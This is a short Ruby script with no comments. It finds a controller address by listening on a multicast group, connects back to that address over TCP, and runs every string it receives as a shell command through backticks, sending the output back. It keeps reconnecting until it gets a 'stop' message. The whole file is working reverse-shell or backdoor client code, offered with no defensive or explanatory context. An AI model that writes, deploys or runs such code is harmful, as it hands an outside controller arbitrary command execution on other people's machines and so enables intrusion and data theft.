require 'socket'
require 'ipaddr'
require 'timeout'

MCAST_GROUP =
  {
    :addr => '224.1.1.1',
    :port => 5007,
    :bindaddr => Socket.ip_address_list[1].ip_address
  }

running = true

ip = ""

while running do # retry connection
  begin
    TCPSocket.open(ip, 5000) do |s|
      while true do # wait for messages
        c = s.recv(1024)
        if c == "stop" then
          s.write("Closing connection")
          sleep 2
          s.close
          running = false
          break
        elsif c == "" then
          s.close
          break
        else
          begin
            s.write(`#{c}`)
          rescue Exception => e
            s.write(e)
          end
        end
      end
    end
  rescue
    sleep 1
    bindaddr = MCAST_GROUP[:bindaddr]

    Socket.ip_address_list do |addr_info|
      if addr_info.ip_address.start_with?('192') then
        bindaddr = addr_info.ip_address
      end
    end

    MCAST_GROUP[:bindaddr] = bindaddr

    begin
      ip_mcast = IPAddr.new(MCAST_GROUP[:addr]).hton + IPAddr.new(MCAST_GROUP[:bindaddr]).hton
      s = UDPSocket.open
      s.setsockopt Socket::IPPROTO_IP, Socket::IP_ADD_MEMBERSHIP, ip_mcast
      s.bind Socket::INADDR_ANY, MCAST_GROUP[:port]

      Timeout.timeout(5) do 
        ip, info = s.recvfrom(1024)
      end
    rescue

    ensure
      s.close
    end
  end
end
